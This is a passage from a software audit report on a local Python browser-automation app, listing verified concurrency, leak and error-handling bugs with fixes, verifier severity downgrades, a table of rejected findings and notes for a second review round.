  (e.g. 15s), so the inner wait fails first and the library's own cleanup runs.
- **Verifier** — **downgraded, medium → low**. Ordering and the missing
  `try/finally` verified in both zendriver methods. But nothing accumulates
  unless the 5s cap actually fires — on a live browser the events arrive in
  milliseconds — and the finding conflates the *recycle* count (~20 per 1000-URL
  run) with the *timeout* count. Each orphan is also nearly free: `wait_for`
  cancels the future, and both leaked closures begin `if future.done(): return`.

## MCAT-018 · leak · low ~~medium~~

- **Location** — `mcat/api/serializers.py:28`; `mcat/services/tracking_service.py:136-138`;
  `mcat/models/project_models.py:143`, `:192`
- **Impact** — `config.runs` grows by one record per tracking run and is never
  pruned; the full list is re-serialized into every SSE project event and every
  `project.json` write, so payload size, encode cost and disk churn grow linearly
  with uptime.
- **Trigger** — The only mutation is `add_run` → `self.runs.append(run)`; a
  repo-wide grep shows only appends and reads. `build_project_dict` does
  `[run.to_dict() for run in project.config.runs]`, and `_schedule_next_check`
  calls `save()` then `publish_project()` on every arming, which happens from
  `_execute_tracking_run`'s `finally` on every tick.
- **Fix** — Send the last N runs in the SSE payload (with a paged endpoint for
  history), and/or prune/archive `config.runs` beyond a retention window.
- **Verifier** — **downgraded, medium → low**. Unbounded growth and the per-tick
  full re-serialize confirmed. Impact is bounded churn on a local single-user app,
  not a failure mode: the default interval is 30 minutes and the UI offers only
  minutes/hours/days, so 288/day is the fastest configurable case, not the norm —
  and each run also creates a disk folder, so this growth is inherent to the design.

## MCAT-020 · leak · low

- **Location** — `mcat/services/tracking_service.py:153-156` vs `:129-130`
- **Impact** — The inverse of a leak: when a tick finds a run already active, the
  intended 5-second retry never happens and the skipped check waits a full
  interval. Monitoring silently loses a check whenever a run overruns a tick.
- **Trigger** — The busy path arms `self._timer = Timer(5, ...)` and returns —
  but that `return` is inside the `try`, so it passes through the `finally`,
  which calls `_schedule_next_check()`, whose first act is
  `if self._timer: self._timer.cancel()` — cancelling the retry it just created —
  before arming the full-interval timer.
- **Fix** — Return through a path that skips the reschedule when the retry was
  armed (e.g. a `_retry_armed` flag checked in the `finally`), and guard all
  `self._timer` read-modify-writes with a lock.
- **Verifier** — **confirmed**. Control flow verified exactly; `Timer.cancel()`
  fires microseconds after `.start()`, well inside the 5s wait, so the retry at
  `:153-155` is dead code.

## MCAT-028 · concurrency · low ~~medium~~

- **Location** — `mcat/core/batch_processor.py:54`
- **Impact** — A cancel issued during the run's startup window is silently
  erased; the batch scrapes every URL to completion while the UI, the run record
  and `_processing_state` all say abandoned. `on_completed` never fires, and the
  user cannot start another run until the phantom batch finishes.
- **Trigger** — `process_csv_async` opens with `self.cancel_flag.clear()`. If
  `/process/abandon` lands between the worker's last `_cancel_event` check
  (`:265`) and this line, `cancel_processing` finds `_loop`/`_session` still
  `None` so no browser stop happens, then line 54 clears the flag and
  `is_cancelled()` reads False for the whole run. At the end `:281` sees
  `_cancel_event` set and returns **without** `_handle_completion`, losing the
  callbacks.
- **Fix** — Delete the `clear()`. The flag belongs to a per-run `BatchProcessor`
  constructed fresh in `start_processing`, so it already starts unset; clearing it
  can only destroy externally-set state.
- **Verifier** — **downgraded, medium → low**. Every sub-claim holds and the fix
  is verified safe (the `BatchProcessor` really is per-run). Downgraded because
  the window is only `asyncio.run`'s loop setup — sub-millisecond — and must be
  hit by an Abandon click in the first instants of a run.

## MCAT-029 · concurrency · low ~~medium~~

- **Location** — `mcat/services/processing_service.py:161-176`
- **Impact** — The UI is told a run was cancelled when it actually completed, and
  `/process/abandon` returns `{"success": true}` having done nothing.
- **Trigger** — `cancel_processing` checks the state under the lock at `:161-163`,
  **releases it**, and only re-acquires at `:172` to set CANCELLED. In between,
  the worker can finish, take the lock, set COMPLETED and fire `on_completed` —
  after which the HTTP thread stamps CANCELLED over it.
- **Fix** — Hold `_state_lock` across the whole check-and-set (same split exists
  in `pause_processing`/`resume_processing`), and move `current_status.state`
  writes inside the lock.
- **Verifier** — **downgraded, medium → low**. The split critical section is
  exactly as described and nothing forbids the interleaving, but a partial guard
  was missed: `_handle_completion` re-checks under the lock (`:306-308`) and
  returns if already CANCELLED, which wins in every ordering except a
  sub-microsecond one. The outcome is also benign — the run genuinely completed,
  the frontend treats `cancelled` as idle, and the misleading log line is skipped
  because `current_run` is already None.

## MCAT-031 · concurrency · low ~~medium~~

- **Location** — `mcat/services/processing_service.py:197-210`
- **Impact** — Closing or switching projects mid-run does not force the browser
  down: an orphan Chrome and its tab pool live for up to ~30s while the newly
  opened project may already have launched a second browser.
- **Trigger** — `cleanup()` sets only `cancel_flag`/`resume_event` on the batch
  processor and calls its `cleanup()` — it never calls
  `BatchProcessor.cancel_processing()`, which is the only thing that force-stops
  the browser via `call_soon_threadsafe(... session.stop())`. So an in-flight
  `wait_for(tab.get(url), PAGE_LOAD_TIMEOUT=30.0)` runs out its full timeout
  before the batch unwinds. `set_project` takes this path on every `/project/open`.
- **Fix** — Have `cleanup()` call `_batch_processor.cancel_processing()` (not just
  `cancel_flag.set()`), and join the worker with a bounded timeout.
- **Verifier** — **downgraded, medium → low**. The missing `cancel_processing()`
  is real. The claimed *consequence* — stale SSE events with climbing counters —
  is neutralised twice over: `batch_processor.py:218` checks `cancel_flag` (set at
  `:202`, **before** the status swap at `:210`) immediately before publishing, and
  even if that µs window is hit, the frontend zeroes counters on any idle-class
  state rather than showing them.

## MCAT-032 · structure · low ~~medium~~

- **Location** — `mcat/services/run_service.py:29-30`
- **Impact** — Duplicate run ids in the timeline and a wrong `run_number` in
  `run.json`.
- **Trigger** — `generate_run_id` is
  `datetime.now().strftime("%Y-%m-%dT%H-%M-%S")` — second resolution, no
  uniqueness check — and `start_run` uses `mkdir(exist_ok=True)`. Reached via the
  MCAT-022 ghost-run path, where several refused Starts can mint records in one
  second.
- **Fix** — Append a monotonic counter or short random suffix, or reject an id
  already present in `config.runs`.
- **Verifier** — **downgraded, medium → low**. All mechanics confirmed including
  `write_header`'s `'w'` mode. But the damaging outcome is **not reachable**: for
  two runs to both write `results.csv` in one second, run 1 must complete
  end-to-end including `zd.start()` browser launch — seconds by itself — and the
  state machine serialises runs anyway. The ghost-run duplicates are both
  ABANDONED and resolve to the same folder, so `/run/results` returns identical
  rather than ambiguous data.

## MCAT-033 · error-handling · low ~~medium~~

- **Location** — `mcat/server.py:185-192`, `:73`, `:180`
- **Impact** — Ordinary user mistakes surface as HTTP 500 with a raw Python
  exception string, and one malformed-request class gets **no response at all**.
- **Trigger** — `do_POST` maps only `ValueError` → 400; everything else → 500 with
  `str(e)`. The user-reachable case: a `project.json` missing a key →
  `ProjectConfig.from_dict` `KeyError('name')` → body `{"error": "'name'"}`,
  shown verbatim in the modal. Also verified but SPA-unreachable: a non-dict JSON
  body reaches `handler(body)` unvalidated → `AttributeError` → 500 plus a full
  traceback; and a malformed `Content-Length` makes `int(...)` at `:73` raise
  **outside** the `json.JSONDecodeError` guard (a `ValueError` subclass relation
  that runs the other way), propagating out of `do_POST` — the stdlib's
  `handle_one_request` catches only `TimeoutError`, so the socket closes with no
  response.
- **Fix** — Assert `isinstance(body, dict)` before dispatch; move the
  `Content-Length` parse inside the guarded block; map `FileNotFoundError`/
  `KeyError` from the project/CSV layer to 4xx with user-facing text.
- **Verifier** — **downgraded, medium → low**. All five sub-cases verified as
  described. Downgraded because `client.ts:46-54` renders `data.error` for **any**
  non-ok status, so 400 and 500 are indistinguishable to this user — the only
  reachable case yields a cosmetically bad message, not a wrong result, and the
  two severe sub-cases require a hand-crafted request.

## MCAT-035 · concurrency · low

- **Location** — `mcat/services/processing_service.py:247`
- **Impact** — `_processing_state` is stranded at PROCESSING permanently, with no
  error state, no callback and no UI notification; the run stays `in_progress`
  and no further run can start.
- **Trigger** — `tempfile.mkstemp(...)` sits **outside** the `try` (which opens at
  `:249`). If it raises — no space on `/tmp`, a restrictive `TMPDIR` — the
  exception skips both the `except` (which would set ERROR and fire `_on_error`)
  and the `finally`, the only place the state is reset. `start_processing` has
  already set and published PROCESSING, so `is_idle()` returns False forever.
- **Fix** — Move `mkstemp` inside the `try`, initializing `temp_csv_path = ""`
  beforehand so the `finally` cleanup stays valid.
- **Verifier** — **confirmed**. The asymmetry is real: every other early return
  (`:251`, `:265`, `:281`) reaches the `finally` with a terminal state already set.
  A full disk is a plausible trigger, which screenshot-enabled runs make reachable.

---

# Rejected (audit trail)

Deleted findings, recorded by id and one-line reason so a later round does not
re-raise the same dead end.

| id | Claim | Why rejected |
| --- | --- | --- |
| MCAT-005 | `sandbox=False` → `--no-sandbox` while rendering CSV-supplied attacker HTML (`browser_manager.py:155`, `login_service.py:70`) | Facts all verified (unconditional, deliberate — zendriver only auto-disables as root), but exploitation requires a separate unpatched Chrome renderer vulnerability. No CVE, no PoC, no reachable step: the "an attacker could" shape the threat model excludes. Worth tracking as non-security hardening — nothing here needs `--no-sandbox`. |
| MCAT-012 | Unauthenticated loopback CDP with `--remote-allow-origins=*` lets a local process dump session cookies | No privilege boundary crossed: the port is randomized, `/json/*` sends no ACAO so a web page cannot learn the target GUID, and any local process that could attach can equally read `cookies/<platform>.json` directly. |
| MCAT-013 | `_extract_username` leaks a raw cookie **value** into logs, SSE, API responses and `mcat_user` | The flow is real, but the value is a public account identifier (`c_user` is the Facebook profile ID), not a credential, and recording it is the documented intent. On a single-user local app the recipient is the account owner. The finding's real content is its verified negative: no session-secret cookie value reaches any sink. |
| MCAT-034 | Swallowed cookie-conversion errors silently drop jar entries before injection (`browser_manager.py:162-166`) | Unreachable. `CookieParam.from_json` **coerces** rather than raising (`zendriver/cdp/network.py:1838-1875`), and the jar's only writer, `cookie_to_dict`, sets `name`/`value` unconditionally — so no drop can occur on app-written data. |
| MCAT-036 | `GET /process/start` returns 200 + SPA HTML in production instead of 405 | Mechanism and the dev/prod divergence confirmed, but no reachable wrong outcome: `/health` is the SPA's **only** GET; all 21 other calls are explicit POSTs. Tidiness, not a defect. |
| MCAT-037 | Unvalidated `interval_unit` silently defaults to minutes — "every 2 weeks" becomes every 2 minutes | The fallback and missing validation are real, but the UI emits only the four units the multiplier table defines (`ControlsInterval.svelte:17-22`), so the flagship scenario cannot be produced; the residual path is the user hand-editing their own local `project.json`. |

---

# Notes for round 2

Raised by verifiers while checking, not yet reviewed as findings:

- `_processing_worker`'s `except` (`processing_service.py:286-291`) calls
  `_on_error` with no `_cancel_event` check, so a worker dying after a project
  switch would call `abandon_run` against whatever project is now open.
- `ProcessingService._pause_event` is **write-only dead state** — set/cleared in
  four places, never read; the scraper reads only `BatchProcessor.resume_event`.
- `BROWSER_ARGS`'s `--disable-features=MediaRouter` is appended *after*
  zendriver's `--disable-features=IsolateOrigins,site-per-process`, and
  Chromium's last-switch-wins parsing means site isolation stays **enabled** — a
  fragile accident that silently reverses if that flag is ever removed.
- The frontend sends `screenshots` in the `/process/start` body
  (`client.ts:82`); the handler ignores it in favour of
  `project.config.screenshots_enabled`.
- `cancel_processing`'s code comment claims stopping the browser makes in-flight
  calls "fail at once" — untrue: zendriver abandons pending transactions without
  resolving them, so those awaits hang until their own `wait_for` fires.
</content>
